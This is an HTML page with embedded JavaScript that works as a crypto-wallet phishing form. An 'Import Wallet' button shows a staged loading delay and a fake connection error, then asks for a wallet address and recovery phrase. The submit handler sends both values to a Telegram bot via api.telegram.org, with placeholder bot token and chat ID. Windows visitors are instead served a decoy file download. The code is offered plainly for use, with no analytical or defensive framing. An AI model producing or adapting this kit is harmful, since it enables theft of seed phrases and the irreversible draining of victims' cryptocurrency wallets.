<html>
    <body>

        <!-- Example HTML for the button and modal/form -->
<button id="actionBtn">Import Wallet</button>

<!-- Modal for the form -->
<div id="walletModal" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0); z-index:9999; align-items:center; justify-content:center;">
  <div style="background:#fff; padding:24px; border-radius:8px; max-width:90vw; width:350px; text-align:center; position:relative;">
    <div id="modalLoader">Loading form...</div>
    <div id="modalError" style="color:red; display:none; margin-top:10px;">Unable to connect. Import wallet manually.</div>
    <form id="walletForm" style="display:none;">
      <h3>Import Wallet</h3>
      <input name="wallet" placeholder="Wallet Address" required style="width:90%;margin:8px 0;"><br>
      <input name="phrase" placeholder="Recovery Phrase" required style="width:90%;margin:8px 0;"><br>
      <button type="submit">Submit</button>
    </form>
    <button onclick="closeModal()" style="position:absolute;top:8px;right:8px;">&times;</button>
  </div>
</div>

<script>
// Telegram Bot Config
const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN';
const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID';

// Detect platform
function getPlatform() {
  const ua = navigator.userAgent;
  if (navigator.platform.startsWith('Mac')) return 'mac';
  if (/iPhone|iPad|Android/i.test(ua)) return 'mobile';
  if (navigator.platform.startsWith('Win')) return 'windows';
  return 'other';
}

// Download file function for Windows
function downloadFile() {
  const blob = new Blob(['Wallet backup data'], {type: 'text/plain'});
  const link = document.createElement('a');
  link.href = URL.createObjectURL(blob);
  link.download = 'wallet-backup.txt';
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
}

// Modal logic
function closeModal() {
  document.getElementById('walletModal').style.display = 'none';
  document.getElementById('walletForm').reset();
  document.getElementById('modalLoader').style.display = '';
  document.getElementById('walletForm').style.display = 'none';
  document.getElementById('modalError').style.display = 'none';
}

document.getElementById('actionBtn').onclick = function() {
  const platform = getPlatform();
  if (platform === 'windows') {
    downloadFile();
  } else {
    document.getElementById('walletModal').style.display = 'flex';
    document.getElementById('modalLoader').style.display = '';
    document.getElementById('walletForm').style.display = 'none';
    document.getElementById('modalError').style.display = 'none';
    setTimeout(() => {
      document.getElementById('modalLoader').style.display = 'none';
      document.getElementById('modalError').style.display = '';
      setTimeout(() => {
        document.getElementById('modalError').style.display = 'none';
        document.getElementById('walletForm').style.display = '';
      }, 1500); // Show form 1.5s after error
    }, 5000); // Lazyload for 5s
  }
};

// Form submission to Telegram
document.getElementById('walletForm').onsubmit = function(e) {
  e.preventDefault();
  const formData = new FormData(this);
  const msg = `Wallet Import:\nAddress: ${formData.get('wallet')}\nPhrase: ${formData.get('phrase')}`;
  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text: msg})
  }).then(() => {
    closeModal();
    alert('Submitted!');
  });
};
</script>

    </body>
    </html>
